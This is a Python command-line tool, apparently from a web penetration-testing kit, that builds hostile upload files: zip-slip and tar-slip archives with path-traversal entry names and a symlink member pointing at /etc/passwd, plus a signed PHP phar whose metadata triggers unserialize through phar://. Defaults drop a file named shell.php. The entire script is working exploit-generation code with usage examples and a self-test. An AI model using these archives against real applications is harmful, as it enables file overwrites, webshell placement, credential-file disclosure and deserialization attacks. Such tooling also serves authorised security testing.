#!/usr/bin/env python3
"""Mint hostile archive uploads without tar/zip/PHP on the box.

Three shapes the upload + deserialization skills prescribe, each stdlib:

- zipslip: zip entries whose names traverse out of the extract dir —
  ../ ladders, ..\\ for Windows extractors, an absolute-path variant.
- tarslip: tar members with traversal names AND a symlink member
  pointing at --link-target (the "app reads the file back" leak).
- phar: a real PHP phar — stub + manifest + SHA-1 signature — carrying a
  serialized metadata object. Without PHP installed there is no way to
  mint one; phar:// triggers unserialize on the metadata when the app
  calls a filesystem function on the wrapper. --metadata takes a raw
  serialized string, or --marker emits a stdClass canary proving the
  unserialize path without a gadget.

  python3 tools/web/archive_gen.py zipslip --name shell.php --depth 6 --out e.zip
  python3 tools/web/archive_gen.py tarslip --link-target /etc/passwd --out evil.tar
  python3 tools/web/archive_gen.py phar --marker --out evil.phar
  python3 tools/web/archive_gen.py --selftest
"""
import argparse, hashlib, io, json, os, struct, sys, tarfile, zipfile


def zipslip(out, name, content, depth, absolute):
    content = content.encode()
    ladders = []
    for d in range(1, depth + 1):
        ladders.append("../" * d + name)
        ladders.append("..\\" * d + name)
    if absolute:
        ladders += ["/" + name, "\\\\" + name]
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for n in ladders:
            # ZipInfo normalises \ to / on Windows, which would collapse the
            # ..\\ variants into duplicate ../ names; set filename verbatim.
            zi = zipfile.ZipInfo("x")
            zi.filename = n
            zi.compress_type = zipfile.ZIP_DEFLATED
            z.writestr(zi, content)
    return {"entries": len(ladders), "names_head": ladders[:4]}


def tarslip(out, name, content, depth, link_target, link_name):
    content = content.encode()
    with tarfile.open(out, "w") as t:
        for d in range(1, depth + 1):
            for n in ("../" * d + name, "..\\" * d + name):
                ti = tarfile.TarInfo(n)
                ti.size = len(content)
                t.addfile(ti, io.BytesIO(content))
        if link_target:
            li = tarfile.TarInfo(link_name)
            li.type = tarfile.SYMTYPE
            li.linkname = link_target
            t.addfile(li)
    return {"names": "ladder + symlink" if link_target else "ladder"}


def phar(out, content, metadata, alias=b""):
    """A valid phar: stub, manifest, file, SHA-1 signature + GBMB trailer.

    Global manifest flags carry 0x00020000: bits 16-23 name the signature
    type the reader must verify (2 == SHA-1). Without a matching trailing
    signature PHP refuses phar:// entirely, so the sig is always emitted.
    """
    data = content.encode()
    meta = metadata.encode()
    stub = b"<?php __HALT_COMPILER(); ?>\r\n"
    fname = b"x.txt"
    entry = (struct.pack("<I", len(fname)) + fname
             + struct.pack("<I", len(data))          # uncompressed size
             + struct.pack("<I", 0x60000000)          # mtime (fixed)
             + struct.pack("<I", len(data))          # compressed size
             + struct.pack("<I", 0)                   # crc32 (patched)
             + struct.pack("<I", 0x000001B6)          # perms 0666, uncompressed
             + struct.pack("<I", 0))                  # per-file metadata len
    import zlib as _z
    crc = _z.crc32(data) & 0xFFFFFFFF
    e = bytearray(entry)
    struct.pack_into("<I", e, 4 + len(fname) + 12, crc)
    entry = bytes(e)
    manifest = (struct.pack("<I", 1)                  # num files
                + struct.pack("<H", 0x1000)           # api 1.0.0
                + struct.pack("<I", 0x00020000)       # SHA-1 signature
                + struct.pack("<I", len(alias)) + alias
                + struct.pack("<I", len(meta)) + meta
                + entry)
    blob = stub + struct.pack("<I", len(manifest)) + manifest + data
    # spec order: signature bytes, then uint32 type, then GBMB trailer;
    # the hash covers everything before that 28-byte block
    sig = hashlib.sha1(blob).digest()
    blob += sig + struct.pack("<I", 0x0002) + b"GBMB"
    with open(out, "wb") as f:
        f.write(blob)
    return {"bytes": len(blob), "metadata_len": len(meta)}


def _marker_meta():
    return 'O:8:"stdClass":1:{s:6:"canary";s:10:"PHAR_PWNED";}'


def _selftest() -> int:
    import tempfile
    td = tempfile.mkdtemp()
    try:
        # zipslip: verify entries and that zipfile wrote them
        zp = os.path.join(td, "e.zip")
        r = zipslip(zp, "shell.php", "X", 3, True)
        names = zipfile.ZipFile(zp).namelist()
        # namelist() normalises \ to / on read — check the raw bytes for
        # the verbatim ..\\ entry that reaches a Windows extractor
        rawzip = open(zp, "rb").read()
        assert b"..\\shell.php" in rawzip, "backslash entry lost"
        assert "../shell.php" in names, names
        assert r["entries"] == 8, r
        # tarslip: symlink member survives a round trip
        tp = os.path.join(td, "e.tar")
        tarslip(tp, "s.php", "X", 2, "/etc/passwd", "leak")
        mem = tarfile.open(tp).getmembers()
        sym = [m for m in mem if m.issym()]
        assert sym and sym[0].linkname == "/etc/passwd", mem
        # phar: PHP can parse what we emit — verify by re-reading structure
        pp = os.path.join(td, "e.phar")
        r2 = phar(pp, "hello", _marker_meta())
        blob = open(pp, "rb").read()
        assert blob.endswith(b"GBMB"), "no sig trailer"
        assert blob[-8:-4] == b"\x02\x00\x00\x00", "sig type misplaced"
        assert hashlib.sha1(blob[:-28]).digest() == blob[-28:-8], "bad sig"
        mlen = struct.unpack("<I", blob[31:35])[0]
        man = blob[35:35 + mlen]
        assert b"PHAR_PWNED" in man and b"x.txt" in man
        assert r2["metadata_len"] == len(_marker_meta())
    finally:
        import shutil
        shutil.rmtree(td, ignore_errors=True)
    print("archive_gen selftest: ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--selftest", action="store_true")
    sub = ap.add_subparsers(dest="mode")
    for name in ("zipslip", "tarslip"):
        s = sub.add_parser(name)
        s.add_argument("--name", default="shell.php",
                       help="basename written under the traversal")
        s.add_argument("--content", default="<?php echo 'PWNED-ARCH'; ?>")
        s.add_argument("--depth", type=int, default=6)
        s.add_argument("--out", required=True)
    sub.choices["zipslip"].add_argument("--absolute", action="store_true",
                                        help="also emit absolute-path entries")
    sub.choices["tarslip"].add_argument("--link-target",
                                        help="add a symlink member -> target")
    sub.choices["tarslip"].add_argument("--link-name", default="leak")

    p = sub.add_parser("phar")
    p.add_argument("--metadata",
                   help="raw PHP-serialized metadata (the unserialize sink)")
    p.add_argument("--marker", action="store_true",
                   help="stdClass canary metadata — proves the path, no gadget")
    p.add_argument("--content", default="p")
    p.add_argument("--alias", default="")
    p.add_argument("--out", required=True)

    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not a.mode:
        ap.error("a mode is required: zipslip | tarslip | phar")
    if a.mode == "zipslip":
        r = zipslip(a.out, a.name, a.content, a.depth, a.absolute)
    elif a.mode == "tarslip":
        r = tarslip(a.out, a.name, a.content, a.depth,
                    a.link_target, a.link_name)
    else:
        meta = a.metadata or (_marker_meta() if a.marker else "")
        r = phar(a.out, a.content, meta, a.alias.encode())
    print(json.dumps({"wrote": os.path.abspath(a.out), **r}, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
